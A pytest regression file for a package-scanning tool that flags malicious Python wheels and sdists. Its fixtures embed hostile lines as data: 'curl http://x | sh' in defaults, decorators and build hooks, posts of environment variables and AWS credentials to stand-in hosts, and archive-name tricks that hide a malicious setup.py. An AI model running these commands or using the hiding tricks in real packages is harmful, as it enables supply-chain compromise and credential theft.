"""Regression tests for the go-live review: inputs that came out clean but run code."""

import pytest

from buckthorn.findings import verdict
from buckthorn.scan import scan_wheel

CURL = "os.system('curl http://x | sh')"


@pytest.mark.parametrize(
    "source",
    [
        f"import os\ndef f(x={CURL}):\n    pass\n",
        f"import os\ndef f(*, x={CURL}):\n    pass\n",
        f"import os\nasync def f(x={CURL}):\n    pass\n",
        f"import os, functools\n@functools.lru_cache(maxsize={CURL})\ndef f():\n    pass\n",
        f"import os\ndef f(x: {CURL}):\n    pass\n",
        f"import os\ndef f() -> {CURL}:\n    pass\n",
        f"import os\ng = lambda x={CURL}: x\n",
        f"import os\nclass C:\n    def m(self, x={CURL}):\n        pass\n",
    ],
)
def test_code_that_runs_when_a_function_is_defined(make_wheel, source):
    findings = scan_wheel(make_wheel({"pkg/__init__.py": source}))
    assert verdict(findings) == "flagged"
    assert "BKT-IMPORT-001" in {f.rule_id for f in findings}


def test_function_body_stays_quiet_next_to_a_plain_default(make_wheel):
    source = "import os\ndef f(x=1):\n    os.system('id')\n"
    assert scan_wheel(make_wheel({"pkg/__init__.py": source})) == []


@pytest.mark.parametrize(
    "loader",
    [
        "import importlib, pkgutil\n"
        "for m in pkgutil.walk_packages(__path__, __name__ + '.'):\n"
        "    importlib.import_module(m.name)\n",
        "import pkgutil\nfrom importlib import import_module as load\n"
        "for m in pkgutil.iter_modules(__path__):\n    load(__name__ + '.tests.' + m.name)\n",
        "import os\nfor n in os.listdir(os.path.dirname(__file__) + '/tests'):\n"
        "    __import__(f'pkg.tests.{n[:-3]}')\n",
    ],
)
def test_test_files_are_not_quiet_when_imported_by_a_computed_name(make_wheel, loader):
    members = {
        "pkg/__init__.py": loader,
        "pkg/tests/__init__.py": "",
        "pkg/tests/evil.py": f"import os\n{CURL}\n",
    }
    assert verdict(scan_wheel(make_wheel(members))) == "flagged"


def test_test_files_stay_quiet_when_nothing_imports_them(make_wheel):
    members = {
        "pkg/__init__.py": "import importlib\nimportlib.import_module('pkg.core')\n",
        "pkg/core.py": "",
        "pkg/tests/evil.py": f"import os\n{CURL}\n",
    }
    assert verdict(scan_wheel(make_wheel(members))) == "clean"


def test_test_files_stay_quiet_next_to_a_lazy_loader(make_wheel):
    members = {
        "pkg/__init__.py": "import importlib\n"
        "def __getattr__(name):\n    return importlib.import_module(f'{__name__}.{name}')\n",
        "pkg/tests/evil.py": f"import os\n{CURL}\n",
    }
    assert verdict(scan_wheel(make_wheel(members))) == "clean"


def test_test_files_are_not_quiet_when_another_file_lists_them(make_wheel):
    members = {
        "pkg/util.py": 'import os\nNAMES = [n[:-3] for n in os.listdir("tests")]\n',
        "pkg/__init__.py": "import importlib\nfrom .util import NAMES\n"
        "for n in NAMES:\n    importlib.import_module('pkg.tests.' + n)\n",
        "pkg/tests/evil.py": f"import os\n{CURL}\n",
    }
    assert verdict(scan_wheel(make_wheel(members))) == "flagged"


def _tar(path, members):
    import io
    import tarfile

    with tarfile.open(path, "w:gz") as tf:
        for name, data in members:
            info = tarfile.TarInfo(name)
            info.size = len(data)
            tf.addfile(info, io.BytesIO(data))
    return path


PLAIN = b"from setuptools import setup\nsetup(name='pkg', version='1.0')\n"
EVIL = f"import os\n{CURL}\n".encode() + PLAIN


@pytest.mark.parametrize(
    "members",
    [
        # tarfile's data filter, which pip uses, drops the leading slash
        [("PKG-INFO", b"Name: pkg\nVersion: 1.0\n"), ("setup.py", PLAIN), ("/setup.py", EVIL)],
        # pip splits the top folder off at a backslash too
        [("pkg-1.0\\PKG-INFO", b"Name: pkg\nVersion: 1.0\n"), ("pkg-1.0\\setup.py", EVIL)],
    ],
)
def test_sdist_member_names_are_read_as_pip_unpacks_them(tmp_path, members):
    from buckthorn.scan import scan_sdist

    findings = scan_sdist(_tar(tmp_path / "pkg-1.0.tar.gz", members))
    assert "BKT-INSTALL-001" in {f.rule_id for f in findings}


def _diff(make_wheel, tmp_path, old_source, new_source, extra=None):
    from buckthorn.cli import main

    old = make_wheel(
        {"pkg/__init__.py": old_source, **(extra or {})}, name="pkg-1.0-py3-none-any.whl"
    )
    new = make_wheel(
        {"pkg/__init__.py": new_source, **(extra or {})}, name="pkg-1.1-py3-none-any.whl"
    )
    return main(["diff", str(old), str(new)])


def test_diff_shows_a_new_call_of_a_kind_already_reported(make_wheel, tmp_path):
    old = "import subprocess\nsubprocess.run(['git', 'describe'])\n"
    assert _diff(make_wheel, tmp_path, old, old + "subprocess.run(['sh', '-c', 'id'])\n") == 1


def test_diff_shows_a_call_swapped_for_another_of_the_same_kind(make_wheel, tmp_path):
    old = "import subprocess\nsubprocess.run(['git', 'describe'])\n"
    new = "import subprocess\nsubprocess.run(['sh', '-c', 'id'])\n"
    assert _diff(make_wheel, tmp_path, old, new) == 1


def test_diff_is_quiet_when_only_the_lines_moved(make_wheel, tmp_path):
    old = "import subprocess\nsubprocess.run(['git', 'describe'])\n"
    assert _diff(make_wheel, tmp_path, old, "# a comment\n" + old) == 0


def test_diff_keeps_a_coverage_gap_both_versions_share(make_wheel, tmp_path):
    broken = {"pkg/broken.py": "def (:\n"}
    assert _diff(make_wheel, tmp_path, "", f"import os\n{CURL}\n", broken) == 1
    assert _diff(make_wheel, tmp_path, "", "", broken) == 1  # not fully read: not verified


def test_sdist_names_that_unpack_differently_are_not_clean(tmp_path):
    from buckthorn.scan import scan_sdist

    members = [
        ("pkg-1.0/PKG-INFO", b"Name: pkg\nVersion: 1.0\n"),
        ("pkg-1.0/setup.py", EVIL),
        ("pkg-1.0/x\\..\\setup.py", PLAIN),  # a plain file name on Linux, setup.py on Windows
    ]
    assert verdict(scan_sdist(_tar(tmp_path / "pkg-1.0.tar.gz", members))) != "clean"


@pytest.mark.parametrize(
    "loader",
    [
        "import importlib.util, os\nd = os.path.dirname(__file__)\n"
        "for n in os.listdir(d + '/tests'):\n"
        "    s = importlib.util.spec_from_file_location('x', os.path.join(d, 'tests', n))\n"
        "    s.loader.exec_module(importlib.util.module_from_spec(s))\n",
        "import importlib, os\nload = importlib.import_module\n"
        "for n in os.listdir(os.path.dirname(__file__) + '/tests'):\n"
        "    load('pkg.tests.' + n[:-3])\n",
        "import importlib, os\nload = getattr(importlib, 'import_module')\n"
        "for n in os.listdir(os.path.dirname(__file__) + '/tests'):\n"
        "    load('pkg.tests.' + n[:-3])\n",
    ],
)
def test_test_files_are_not_quiet_when_loaded_by_path_or_alias(make_wheel, loader):
    members = {
        "pkg/__init__.py": loader,
        "pkg/tests/__init__.py": "",
        "pkg/tests/payload.py": f"import os\n{CURL}\n",
    }
    assert verdict(scan_wheel(make_wheel(members))) == "flagged"


def test_backslash_names_cannot_hide_the_real_setup_py(tmp_path):
    from buckthorn.scan import scan_sdist

    members = [
        ("pkg-1.0/PKG-INFO", b"Name: pkg\nVersion: 1.0\n"),
        ("pkg-1.0/setup.py", EVIL),
        ("pkg-1.0/a\\..\\..\\setup.py", PLAIN),
        ("pkg-1.0/a\\..\\..\\PKG-INFO", b"Name: pkg\nVersion: 1.0\n"),
    ]
    assert verdict(scan_sdist(_tar(tmp_path / "pkg-1.0.tar.gz", members))) != "clean"


def test_diff_is_quiet_when_a_line_only_names_the_new_version(make_wheel, tmp_path):
    old = "import subprocess\nsubprocess.run(['echo', '1.0'])\n"
    assert _diff(make_wheel, tmp_path, old, old.replace("1.0", "1.1")) == 0


def test_diff_shows_the_critical_finding_when_another_send_is_added(make_wheel, tmp_path):
    from buckthorn.findings import new_findings

    old = "import os, requests\nrequests.post('http://a', json=dict(os.environ))\n"
    new = old + "requests.post('http://b', data=open(os.path.expanduser('~/.aws/credentials')))\n"
    before = scan_wheel(make_wheel({"pkg/__init__.py": old}, name="pkg-1.0-py3-none-any.whl"))
    after = scan_wheel(make_wheel({"pkg/__init__.py": new}, name="pkg-1.1-py3-none-any.whl"))
    added = {f.rule_id for f in new_findings(before, after, "1.0", "1.1")}
    assert "BKT-IMPORT-008" in added


def test_allowlist_matches_the_path_the_file_installs_at(make_wheel, tmp_path):
    import json

    from buckthorn.cli import main

    allow = tmp_path / "allow.json"
    rules = ("BKT-IMPORT-001", "BKT-IMPORT-002", "BKT-REC-002")
    entries = [{"rule": r, "package": "pkg", "file": "pkg/tests/*", "reason": "r"} for r in rules]
    allow.write_text(json.dumps({"allow": entries}))
    wheel = make_wheel({"pkg/tests/../__init__.py": f"import os\n{CURL}\n"})
    assert main(["scan", "--allowlist", str(allow), str(wheel)]) == 1


IN_BUILD = (
    b"import os\nfrom setuptools import setup\nfrom setuptools.command.build_py import build_py\n"
    b"class B(build_py):\n    def run(self):\n        os.system('curl http://x | sh')\n"
    b"setup(cmdclass={'build_py': B})\n"
)


@pytest.mark.parametrize(
    "name",
    [
        "Setup.py",
        "SETUP.PY",
        "PyProject.toml",
        "Setup.cfg",
        "setup.py.",
        "setup.py ",
        "setup.py::$DATA",
    ],
)
def test_build_files_named_in_another_case_are_not_clean(tmp_path, name):
    from buckthorn.scan import scan_sdist

    members = [("pkg-1.0/PKG-INFO", b"Name: pkg\nVersion: 1.0\n"), (f"pkg-1.0/{name}", IN_BUILD)]
    assert verdict(scan_sdist(_tar(tmp_path / "pkg-1.0.tar.gz", members))) != "clean"


def test_a_lowercase_setup_py_is_still_clean_when_plain(tmp_path):
    from buckthorn.scan import scan_sdist

    members = [("pkg-1.0/PKG-INFO", b"Name: pkg\nVersion: 1.0\n"), ("pkg-1.0/setup.py", PLAIN)]
    assert verdict(scan_sdist(_tar(tmp_path / "pkg-1.0.tar.gz", members))) == "clean"
